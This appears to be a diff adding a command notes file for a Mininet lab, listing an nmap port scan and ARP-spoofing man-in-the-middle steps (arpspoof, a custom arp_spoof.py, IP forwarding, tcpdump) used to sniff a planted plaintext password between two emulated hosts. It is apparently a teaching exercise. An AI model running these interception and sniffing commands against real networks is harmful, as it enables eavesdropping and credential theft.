@@ -1,0 +1,50 @@
+# language error for the pingall command in mininet
+export LANG=en_US.UTF-8
+
+# test 
+sh deploy.sh
+
+######### ATTACKS #########
+# port scanning
+attacker nmap -p 80,443 10.0.0.1
+
+# ARP Spoofing
+# mislead the host into thinking that the attacker is the other host.
+# 1) test the arp_spoofing script
+sudo apt install scapy
+sudo python3 network_topology.py
+# then in mininet :
+attacker python3 arp_spoof.py 10.0.0.1 10.0.0.2 
+
+# 2) STEAL A PASSWORD with arpspoof
+# in mininet :
+xterm h1 h2 attacker attacker
+# in h1 
+cd /tmp
+echo "hello the password is OPPENHEIMER" > index.html
+python3 -m http.server 81 &
+# in attacker(1), we activate forwarding, so that the attacker forward stuffs
+sysctl -w net.ipv4.ip_forward=1
+# in attacker(2), we launch tcpdump
+tcpdump -i attacker-eth0 -A -s0 'host 10.0.0.1 and host 10.0.0.2 and  tcp port 81'
+# in attacker(1)
+arpspoof -i attacker-eth0 -t 10.0.0.1 10.0.0.2
+# in h2
+curl http://10.0.0.1:81/index.html
+# in attacker(2), we see the password
+
+# 3) Same but with the arp_spoofing.py script
+# in mininet :
+xterm h1 h2 attacker attacker
+# in h1
+cd /tmp
+echo "hello the password is OPPENHEIMER" > index.html
+python3 -m http.server 81 &
+# in attacker(1)
+tcpdump -i attacker-eth0 -A -s0 'port 81'
+# in attacker(2)
+sysctl -w net.ipv4.ip_forward=1
+sudo python3 arp_spoof.py 10.0.0.1 10.0.0.2
+# in h2
+curl http://10.0.0.1:81/index.html
+# in attacker(1), we see the password
